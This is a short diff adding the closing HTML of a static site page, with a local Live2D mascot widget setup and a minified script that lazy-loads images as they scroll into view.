+    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+</html>
